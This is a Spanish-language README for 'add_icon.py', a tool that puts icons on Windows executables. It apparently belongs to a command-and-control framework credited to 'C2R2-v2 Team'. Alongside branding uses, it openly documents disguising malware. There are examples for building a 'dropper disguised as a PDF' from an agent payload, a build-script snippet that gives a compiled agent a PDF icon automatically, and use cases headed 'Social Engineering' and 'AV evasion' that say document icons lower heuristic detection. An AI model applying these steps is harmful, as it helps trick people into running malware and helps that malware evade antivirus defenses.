# 🎨 add_icon.py - Gestor de Iconos para Ejecutables Windows

Herramienta Python profesional para añadir y gestionar iconos en archivos `.exe` de Windows.

## ✨ Características

- ✅ **Auto-descarga rcedit**: No necesitas instalar nada manualmente
- ✅ **Conversión automática**: Convierte PNG/JPG/BMP a ICO
- ✅ **Iconos predefinidos**: Word, Excel, PDF, ZIP, TXT
- ✅ **Multi-resolución**: Genera iconos en 16x16, 32x32, 48x48, 256x256
- ✅ **Modo verboso**: Debug detallado del proceso
- ✅ **Info de recursos**: Ve qué recursos tiene un .exe

## 📦 Instalación

```bash
# Instalar dependencias
pip install -r requirements.txt

# O manualmente
pip install Pillow requests
```

## 🚀 Uso

### 1. Icono por defecto (PDF)

```bash
python add_icon.py agent.exe
```

### 2. Icono personalizado

```bash
python add_icon.py agent.exe --icon custom.ico
```

### 3. Convertir imagen a ICO

```bash
# Desde PNG
python add_icon.py agent.exe --icon logo.png --convert

# Desde JPG
python add_icon.py agent.exe --icon photo.jpg --convert

# Con tamaños personalizados
python add_icon.py agent.exe --icon image.png --convert --sizes 32 64 128 256
```

### 4. Descargar iconos predefinidos

```bash
# Icono PDF
python add_icon.py document.exe --download pdf

# Icono Word
python add_icon.py report.exe --download word

# Icono Excel
python add_icon.py spreadsheet.exe --download excel

# Icono ZIP
python add_icon.py archive.exe --download zip

# Icono TXT
python add_icon.py readme.exe --download txt
```

### 5. Ver información de recursos

```bash
python add_icon.py agent.exe --info
```

### 6. Modo verboso

```bash
python add_icon.py agent.exe -v
```

## 🎯 Ejemplos Completos

### Ejemplo 1: Dropper disfrazado de PDF

```bash
# Crear dropper
python builder.py --payload agent.exe --output document.exe

# Añadir icono PDF
python add_icon.py document.exe --download pdf -v
```

### Ejemplo 2: Usar logo personalizado

```bash
# Convertir logo de empresa a ICO y aplicar
python add_icon.py company_tool.exe --icon company_logo.png --convert --sizes 32 48 256
```

### Ejemplo 3: Batch processing

```bash
# Aplicar mismo icono a múltiples ejecutables
for exe in dist/*.exe; do
    python add_icon.py "$exe" --download pdf
done
```

## 📋 Opciones Completas

```
usage: add_icon.py [-h] [-i ICON] [-c] [--sizes SIZES [SIZES ...]]
                   [--download {pdf,word,excel,zip,txt}] [--info] [-v]
                   [--version]
                   exe

Argumentos posicionales:
  exe                   Ruta al ejecutable .exe

Opciones:
  -h, --help            Mostrar ayuda
  -i, --icon ICON       Archivo de icono (.ico, .png, .jpg)
  -c, --convert         Convertir imagen a ICO
  --sizes [SIZES ...]   Tamaños del icono (default: 16 32 48 256)
  --download {pdf,word,excel,zip,txt}
                        Descargar icono predefinido
  --info                Ver recursos del ejecutable
  -v, --verbose         Modo verboso
  --version             Versión del programa
```

## 🔧 Integración con Builder

```python
# En tu script de build
import subprocess

# Compilar agente
subprocess.run(["cargo", "build", "--release"])

# Añadir icono automáticamente
subprocess.run([
    "python", "add_icon.py",
    "target/release/agent.exe",
    "--download", "pdf",
    "-v"
])
```

## 🎨 Formatos Soportados

### Entrada (Conversión)
- ✅ PNG
- ✅ JPG/JPEG
- ✅ BMP
- ✅ GIF
- ✅ WEBP
- ✅ ICO (directo)

### Salida
- ✅ ICO (Windows Icon)
  - Multi-resolución: 16x16, 32x32, 48x48, 256x256
  - 32-bit color (RGBA)
  - Transparencia soportada

## 📊 Comparación con PowerShell Script

| Característica | Python | PowerShell |
|----------------|--------|------------|
| Conversión PNG→ICO | ✅ Pillow | ❌ .NET limitado |
| Multi-resolución | ✅ 4 tamaños | ❌ 1 tamaño |
| Iconos predefinidos | ✅ 5 tipos | ❌ Solo PDF |
| Cross-platform | ✅ Win/Linux/Mac | ❌ Solo Windows |
| Modo info | ✅ Sí | ❌ No |
| CLI profesional | ✅ argparse | ❌ Básico |

## 🐛 Troubleshooting

### Error: "Module 'PIL' not found"

```bash
pip install Pillow
```

### Error: "rcedit.exe failed"

El ICO puede estar corrupto. Usa `--convert` para regenerarlo:

```bash
python add_icon.py agent.exe --icon badicon.ico --convert
```

### Error: "Requests module not found"

```bash
pip install requests
```

### ICO se ve pixelado

Usa tamaños más grandes:

```bash
python add_icon.py agent.exe --icon logo.png --convert --sizes 64 128 256 512
```

## 🔐 Seguridad

- ⚠️ **rcedit modifica el ejecutable**: Puede invalidar firmas digitales
- ⚠️ **Descarga externa**: Los iconos se descargan de Wikipedia (HTTPS)
- ✅ **Sin telemetría**: El script no envía datos a ningún servidor
- ✅ **Open source**: Código revisable y modificable

## 🎯 Casos de Uso

### Social Engineering
```bash
# Dropper disfrazado de documento
python add_icon.py payload.exe --download pdf
```

### Branding
```bash
# Herramientas con logo corporativo
python add_icon.py company_tool.exe --icon corporate_logo.png --convert
```

### Evasión AV
```bash
# Iconos legítimos reducen detección heurística
python add_icon.py agent.exe --download word -v
```

## 📚 Recursos

- [rcedit GitHub](https://github.com/electron/rcedit)
- [Pillow Documentation](https://pillow.readthedocs.io/)
- [Windows ICO Format](https://en.wikipedia.org/wiki/ICO_%28file_format%29)

## 🤝 Contribuir

```bash
# Añadir nuevo icono predefinido
# Editar icon_urls en add_icon.py línea ~230
'nuevo_tipo': 'https://url-del-icono.png'
```

---

**Versión**: 1.0.0  
**Autor**: C2R2-v2 Team  
**Licencia**: MIT
